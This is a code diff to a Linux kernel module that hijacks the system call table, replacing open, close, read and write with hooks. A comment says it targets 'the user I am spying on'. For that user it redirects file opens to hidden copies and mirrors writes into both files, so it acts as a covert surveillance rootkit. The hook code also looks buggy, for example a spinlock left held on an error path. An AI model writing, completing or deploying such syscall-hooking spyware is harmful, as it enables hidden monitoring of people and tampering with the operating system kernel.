@@ -4,20 +4,20 @@
 #include <linux/unistd.h>
 #include <linux/sched.h>
 #include <linux/fs.h>
-#include <asm/uaccess.h>
 #include <linux/cred.h>
 #include <linux/syscalls.h>
 #include <linux/namei.h>
 #include <linux/init.h>
-#include <asm/cacheflush.h>
 #include <linux/slab.h>
-#include <asm/segment.h>
 #include <linux/buffer_head.h>
 #include <linux/fcntl.h>
 #include <linux/string.h>
 #include <linux/file.h>
 #include <linux/fsnotify.h>
-
+#include <linux/fdtable.h>
+#include <asm/uaccess.h>
+#include <asm/cacheflush.h>
+#include <asm/segment.h>
 
 ///< The license type -- this affects runtime behavior
 MODULE_LICENSE("GPL");
@@ -67,8 +67,9 @@ void (*pages_ro)(struct page *page, int numpages) = (void *) 0xffffffff81034560;
  * It's a static variable, so it is not exported. 
  */
 asmlinkage int (*original_open) (const char *, int, int);
+asmlinkage int (*original_read) (int, void*, size_t);
+asmlinkage int (*original_write) (int, const void *, size_t);
 asmlinkage int (*original_close) (int);
-
 
 /*
  * Routines for creating, reading, and writing files in Kernel space
@@ -163,15 +164,6 @@ asmlinkage int our_sys_open(const char *filename, int flags, int mode)
 	 * Check if this is the user I am spying on 
 	 */
 	if(get_current_user()->uid == uid){
-		// To handle this address space mismatch, 
-		// use the functions get_fs() and set_fs(). 
-		// These functions modify the current process 
-		// address limits to whatever the caller wants. 
-		// In the case of sys_open(), we want to tell the 
-		// kernel that pointers from within the kernel address 
-		// space are safe, so we call:
-		//mm_segment_t old_fs = get_fs();
-  		//set_fs(KERNEL_DS);
 
 		char *hidden_path;
 		char * name;
@@ -216,7 +208,10 @@ asmlinkage int our_sys_open(const char *filename, int flags, int mode)
 			Therefore, need to use filp_open
 		 */
 		
-		fd = get_unused_fd_flags(flags);
+		// IMPORTANT: Need to modify the kernel source code 
+		// need to add EXPORT_SYMBOL to alloc_fd functions and 
+		// some helper functions in order to use it
+		fd = get_unused_fd_flags(flags); 
 		if (fd >= 0) {
 		
 			struct file * cpy_file = filp_open(hidden_path, 
@@ -229,8 +224,8 @@ asmlinkage int our_sys_open(const char *filename, int flags, int mode)
 				printk(KERN_INFO "installed new file descriptor : %d. \n", fd);
 				
 				// Return the wrong file descriptor that I just made
-				//return fd;
-				filp_close(cpy_file, NULL);
+				return fd;
+
 			} else {
 				put_unused_fd(fd);
 				fd = PTR_ERR(cpy_file);
@@ -245,6 +240,155 @@ asmlinkage int our_sys_open(const char *filename, int flags, int mode)
 
 }
 
+asmlinkage int our_sys_close(int fd) 
+{
+	// find the file object associate with fd
+	struct files_struct *files = current->files;
+	struct fdtable *fdt;
+	struct file * filp;
+	struct path *path;
+	char *pathname;
+	char *tmp;
+	int i;
+	int actual_fd = fd;
+	
+	spin_lock(&files->file_lock);
+	fdt = files_fdtable(files);
+	filp = fdt->fd[fd];
+	path = &filp->f_path;
+    path_get(path);
+    tmp = (char *)__get_free_page(GFP_KERNEL);
+    if (!tmp) {
+    	path_put(path);
+    	return -ENOMEM;
+	}
+	
+	pathname = d_path(path, tmp, PAGE_SIZE);
+	path_put(path);
+	
+	//change back the path name
+	for(i=0; i<strlen(pathname); i++){
+		if(pathname[i] == '-'){
+			pathname[i] = '/';
+		}
+	}
+	
+	// find the original file
+	for(i=0; i<fdt->max_fds; ++i){
+		struct file *f = fdt->fd[i];
+		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
+			actual_fd = i;
+			break;
+		}
+	}
+	// close both files
+	spin_unlock(&files->file_lock);							
+	original_close(fd);
+	return original_close(actual_fd);
+}
+
+asmlinkage int our_sys_read(int fd, void* buf, size_t count) 
+{
+
+	// find original file
+	// read from original file
+		// find the file object associate with fd
+	struct files_struct *files = current->files;
+	struct fdtable *fdt;
+	struct file * filp;
+	struct path *path;
+	char *pathname;
+	char *tmp;
+	int i;
+	int actual_fd = fd;
+	
+	spin_lock(&files->file_lock);
+	fdt = files_fdtable(files);
+	filp = fdt->fd[fd];
+	path = &filp->f_path;
+    path_get(path);
+    tmp = (char *)__get_free_page(GFP_KERNEL);
+    if (!tmp) {
+    	path_put(path);
+    	return -ENOMEM;
+	}
+	
+	pathname = d_path(path, tmp, PAGE_SIZE);
+	path_put(path);
+	
+	//change back the path name
+	for(i=0; i<strlen(pathname); i++){
+		if(pathname[i] == '-'){
+			pathname[i] = '/';
+		}
+	}
+	
+	// find the original file
+	for(i=0; i<fdt->max_fds; ++i){
+		struct file *f = fdt->fd[i];
+		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
+			actual_fd = i;
+			break;
+		}
+	}
+	// read from actual files
+	spin_unlock(&files->file_lock);							
+	
+	return original_read(actual_fd, buf, count);
+
+
+}
+
+asmlinkage int our_sys_write(int fd, const void* buf, size_t count) 
+{
+
+	// find original file
+	// perform the same write to the original file
+		// find the file object associate with fd
+	struct files_struct *files = current->files;
+	struct fdtable *fdt;
+	struct file * filp;
+	struct path *path;
+	char *pathname;
+	char *tmp;
+	int i;
+	int actual_fd = fd;
+	
+	spin_lock(&files->file_lock);
+	fdt = files_fdtable(files);
+	filp = fdt->fd[fd];
+	path = &filp->f_path;
+    path_get(path);
+    tmp = (char *)__get_free_page(GFP_KERNEL);
+    if (!tmp) {
+    	path_put(path);
+    	return -ENOMEM;
+	}
+	
+	pathname = d_path(path, tmp, PAGE_SIZE);
+	path_put(path);
+	
+	//change back the path name
+	for(i=0; i<strlen(pathname); i++){
+		if(pathname[i] == '-'){
+			pathname[i] = '/';
+		}
+	}
+	
+	// find the original file
+	for(i=0; i<fdt->max_fds; ++i){
+		struct file *f = fdt->fd[i];
+		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
+			actual_fd = i;
+			break;
+		}
+	}
+	// write to both files
+	spin_unlock(&files->file_lock);							
+	original_write(actual_fd, buf, count);
+	return original_write(fd, buf, count);
+
+}
 
 /* 
  * Initialize the module - replace the system call 
@@ -270,8 +414,14 @@ int init_module()
 	 */
 	original_open 	= sys_call_table[__NR_open];
 	original_close 	= sys_call_table[__NR_close];
+	original_read 	= sys_call_table[__NR_read];
+	original_write 	= sys_call_table[__NR_write];
 
+	// replace them with our version
 	sys_call_table[__NR_open] = our_sys_open;
+	sys_call_table[__NR_close] = our_sys_close;
+	sys_call_table[__NR_read] = our_sys_read;
+	sys_call_table[__NR_write] = our_sys_write;
 
 	/* 
 	 * To get the address of the function for system
